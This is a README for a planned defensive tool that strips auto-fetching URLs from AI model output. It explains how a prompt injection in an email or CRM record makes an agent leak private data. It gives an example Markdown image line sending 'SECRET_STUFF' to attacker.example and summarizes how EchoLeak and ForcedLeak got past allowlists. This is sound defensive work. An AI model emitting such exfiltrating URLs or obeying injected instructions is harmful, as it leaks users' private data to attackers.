# 🛡️ mcp-outbound-shield

A deterministic output sanitizer and CSP generator for AI host applications. It prevents **zero-click data exfiltration** by neutralizing auto-fetching content before it reaches the UI renderer.

> **Status: pre-alpha.** The specification ([SPEC.md](./SPEC.md)) and test matrix are defined. The implementation (TypeScript) has not been written yet. Do not use in production.

---

## 🚨 The problem: zero-click exfiltration

AI agents (Microsoft 365 Copilot, Slack bots, Salesforce Agentforce, and others) are granted access to private data. An attacker plants a hidden prompt injection in an email, CRM lead, or chat message. The hijacked model reads private data and is tricked into emitting a Markdown image or HTML tag with that data in the URL:

```
![hidden](https://attacker.example/log?data=SECRET_STUFF)
```

When the chat UI renders the message, the browser fetches the image and silently delivers the data to the attacker. **No click is required.**

Public examples include **EchoLeak** (Microsoft 365 Copilot, CVE-2025-32711) and **ForcedLeak** (Salesforce Agentforce, disclosed by Noma Security). Both involved URLs on domains that were trusted or allowlisted. *(Verify CVE identifiers against NVD before citing them elsewhere.)*

## ❌ Why existing tools aren't enough

Most open-source effort targets the *inbound* side (guessing whether a prompt is malicious) or *infrastructure* (network routing, SSRF filters). Inbound detection is probabilistic and is bypassed by obfuscation and multi-turn attacks. Some vendor frameworks also ship response sanitizers that developers cannot customize for their own domains.

## ✅ Our approach: assume the model is compromised

`mcp-outbound-shield` runs **inside the host application**, between the model's output (including tool results) and the UI renderer. It does not try to judge intent. It enforces a simple rule:

> **Only URLs that match an explicit policy may be emitted in auto-fetching positions, and every emitted URL is rewritten to the exact canonical form that was evaluated.**

Design principles:

- **Deterministic.** No LLM in the loop. Same input and policy give the same output.
- **Default-deny.** Unknown HTML tags and attributes are removed. Known-bad vector lists are used as a test corpus, not as the defense.
- **Fail-closed.** If the shield cannot reach a verdict, nothing unverified reaches the renderer.
- **Evaluate what the browser fetches.** URLs are parsed with the WHATWG URL parser (the same algorithm browsers use), and the canonical result is what gets emitted.
- **Structure beats heuristics.** Closed shapes (exact hosts, path patterns, query allowlists) are the primary control. Entropy and encoding checks are a secondary backstop.

## ✨ Core defenses

1. **Primary control: host, path, and query allowlisting.** Policy lists exact hosts, path patterns (for example `/my-org/assets/*.png`), and permitted query parameters. Queries are rejected by default. `*` in a path matches exactly one segment.
2. **Explicit subdomains.** Subdomains must be listed by name (`allowed_subdomains: ["cdn"]`). Open wildcards are discouraged, require an explicit acknowledgment, and are still restricted.
3. **Default-deny HTML/Markdown sanitization.** Content is parsed to an AST using the same parser family as the reference renderer (unified/remark/rehype, parse5). Only a small allowlist of tags and attributes survives. SVG, MathML, `style`, `iframe`, `script`, `base`, `meta`, `link`, `srcset`, and similar are removed.
4. **Heuristic backstop.** For dynamic path segments and permitted query values: length ceilings, Shannon entropy, and Base64/hex signatures. These are deterministic but bypassable by design; they limit damage on allowlisted hosts, they do not define the security boundary.
5. **Browser-enforced backstop (CSP exporter).** Generates fetch-related CSP directives and companion headers from the same `policy.json`, so the browser blocks what a parser differential might miss.
6. **Idempotency tripwire.** The engine verifies `sanitize(sanitize(x)) == sanitize(x)` and fails closed if it does not. This detects mutation-XSS style differentials. It is a tripwire, not a proof of safety.
7. **Fail-closed on system errors.** Depth/node limits, internal exceptions, and idempotency failures trigger `on_error` (drop the message). Malformed-but-parseable input, such as unclosed HTML tags that HTML5 parsers recover from, is sanitized rather than dropped.

## 🖥️ Reference renderer profile

Whether something is "zero-click" depends on the client. The shield is specified and tested against this profile, modeled on Open WebUI-style stacks:

- CommonMark + GFM (including bare `www.` autolinks and reference links)
- Raw HTML enabled via an HTML5 parser (`rehype-raw`)
- Mermaid and KaTeX plugins present
- Client-side link-preview unfurling enabled
- Incremental rendering over Server-Sent Events

If your renderer differs (no raw HTML, no unfurling), tune `renderer_profile` accordingly and re-run the test matrix against your actual renderer.

## 🛠️ How it works

Pipeline, in order:

1. Receive model output (full string or token stream).
2. Parse to an AST. Take every URL string exactly as the parser delivers it (the shield never decodes markup itself).
3. For each auto-fetch vector (images, HTML media/frame tags, reference definitions, bare URL autolinks, CSS and SVG are removed by default-deny), run the URL through the normalization pipeline and policy check described in [SPEC.md](./SPEC.md).
4. Replace allowed URLs with their canonical form. Handle violations per `on_violation`.
5. Serialize, run the idempotency check, and emit.
6. Record an audit event for every stripped, rewritten, or defanged item.

### Streaming

Chat UIs render tokens as they arrive, and a fetch can fire the instant a closing `)` or `>` streams in. Two modes:

- **Buffered:** hold the whole message, sanitize, emit.
- **Incremental prefix-reparse (default):** scan character by character, flush plain text immediately, hold only a potential construct (`![`, `<`, `[`, `http`, `www.`, `//`, `\`) until it resolves, re-parse with full document context (code fences, open HTML blocks), and flush the verified prefix.

Guarantee: for any input and any chunking, streamed output equals buffered output. This is enforced by a property test.

Reference-style links and images are controlled at their **definitions**: a definition whose URL violates policy is removed, so a forward reference like `![a][1]` can never resolve to an untrusted URL even if the definition arrives last.

## 🚀 Configuration (`policy.json`)

```json
{
  "version": 1,
  "renderer_profile": { "unfurls_links": true },
  "stream_mode": "incremental_prefix",
  "link_handling_mode": "defang_untrusted",
  "on_violation": "strip_node",
  "on_error": "drop_message",
  "rich_blocks": "inert",
  "limits": {
    "max_input_bytes": 1048576,
    "max_construct_bytes": 4096,
    "max_depth": 64,
    "max_nodes": 10000
  },
  "default_heuristics": {
    "max_uri_length": 200,
    "max_segment_entropy": 4.2,
    "max_path_depth": 6
  },
  "allowlist": {
    "assets.mycompany.internal": {
      "allowed_paths": ["/assets/*.png", "/avatars/*.png"],
      "allow_query": false,
      "max_uri_length": 300
    },
    "static.mycompany.internal": {
      "allowed_subdomains": ["cdn"],
      "allowed_paths": ["/img/*.png"],
      "allow_query": false
    },
    "github.com": {
      "allowed_paths": ["/my-org/my-repo/assets/*.png"],
      "path_case_insensitive": true,
      "allow_query": true,
      "allowed_query_params": ["raw"],
      "max_param_value_length": 8,
      "max_uri_length": 250
    },
    "my-tenant.sharepoint.com": {
      "allowed_paths": ["/sites/company-public/**"],
      "allow_query": false,
      "max_uri_length": 800
    }
  }
}
```

The policy is validated at load time. A malformed or ambiguous policy (unknown keys, empty `allowed_paths`, wildcard without acknowledgment) **refuses to load**. Full semantics are in [SPEC.md](./SPEC.md).

| Setting | Values |
|---|---|
| `on_violation` | `strip_node`, `replace_placeholder`, `defang` |
| `on_error` | `drop_message`, `abort_stream` |
| `link_handling_mode` | `allow`, `warn`, `defang_untrusted`, `strip_untrusted` |
| `rich_blocks` | `inert` (default): Mermaid fences become plain code blocks; math containing URL-bearing macros is removed |

`link_handling_mode` defaults to `defang_untrusted` because the reference profile unfurls links. If your renderer does not unfurl, `warn` is reasonable.

## 🧱 CSP exporter

`generateCSP(policy)` returns **fetch-related directives to merge into your app's existing CSP** (`img-src`, `media-src`, `font-src`, `frame-src`, `object-src`), plus recommended companion headers (`X-DNS-Prefetch-Control: off`, `Referrer-Policy: no-referrer`). It deliberately does not emit `default-src`, which would break your own scripts.

Limits to understand:

- CSP path matching is a prefix match and is dropped after a redirect, so it is coarser than the shield's policy. This is why open redirects on allowlisted hosts matter.
- CSP does not stop DNS prefetch fully (the header helps) or server-side unfurling by third-party services.
- Rendering messages inside a sandboxed iframe is a strong additional layer.

## ⚠️ Allowlist hygiene and known limitations

An allowlist is only as safe as the hosts on it.

- **Open redirects and URL proxies (the weakest spot).** EchoLeak reportedly succeeded by routing through a trusted Microsoft endpoint that proxied attacker-controlled URLs. Mitigate with `allow_query: false` and narrow, extension-restricted path patterns.
- **Expired domains.** ForcedLeak reportedly worked because a domain on the allowlist had expired and was purchased by the researchers. Audit your allowlist and ownership regularly.
- **Shared hosting.** Never allowlist `*.github.io`, `*.herokuapp.com`, `*.s3.amazonaws.com`, or similar. Anyone can register a subdomain.
- **Attacker-observable origins.** Heuristics matter most where an attacker can read request logs (their own repo, tenant, bucket, or redirect target). Leaking into the path of a host only you control is harmless. When reviewing the allowlist, ask for each entry: *can an attacker read requests to this origin?*
- **Wildcard subdomains leak to your own DNS.** Data can ride in subdomain labels toward your resolver logs. Hostnames are case-folded by URL parsing, so "uppercase Base64" is not detectable. Prefer explicit `allowed_subdomains`.
- **Heuristics are bypassable.** Short chunks of data can fit inside any permitted shape. The structural limits (single-segment `*`, path depth, query allowlists, extension restrictions) bound how much, but not zero.
- **Self-inflicted denial.** An attacker can craft input that triggers depth limits or `on_error`, causing messages to be dropped. That is the intended fail-closed trade-off. Audit logs record it.
- **Renderer differences.** Verified only against the reference profile and the renderers listed in the test results. Re-verify for your client.

## 🚫 Not covered

- **Outbound tool calls:** data sent by the model invoking an external MCP tool or API. This must be governed at the tool-execution boundary.
- **Plaintext leakage and social engineering:** sensitive text printed in the reply, or tricking the user into copying data elsewhere.
- **One-click phishing links:** ordinary links that require a deliberate click (unless your renderer unfurls them; see `link_handling_mode`).
- **Adaptive Cards and other JSON card schemas** (not parsed in v1).
- **Server-side unfurlers that read raw message text outside your pipeline.**
- **Timing side channels.**

## ✅ Verification

The project is test-first. The full bypass matrix (URL normalization, vectors, streaming) is in [SPEC.md](./SPEC.md#14-test-matrix), and v1.0 requires:

- 100% pass on the bypass matrix
- Property-based tests: for any input, output contains no URL outside policy; sanitize is idempotent; streamed output equals buffered output for random chunkings
- Fuzzing of the URL evaluator and the sanitizer
- Headless-browser tests that render sanitized output and assert **zero outbound requests** to non-allowlisted hosts
- Coverage reporting (treated as a floor, not evidence of safety)

## 🗺️ Roadmap

1. URL evaluator (pure function: URL + policy → canonical URL or rejection reason) with full test suite
2. Policy loader and validator
3. Markdown/HTML sanitizer (default-deny) with audit events
4. Streaming sanitizer with equivalence property tests
5. CSP exporter
6. Integration wrapper for one host stack (for example, the official MCP TypeScript SDK or a react-markdown pipeline)
7. Headless-browser verification suite and CI fuzzing

## 🤝 Contributing

Contributions are welcome, especially:

- Bypass payloads and parser-differential reports (add them to the test matrix)
- Renderer verification against additional chat UIs
- Review of the specification before implementation hardens

Please read `SECURITY.md` before reporting a vulnerability; use private disclosure rather than a public issue.

## 📄 License

Apache-2.0
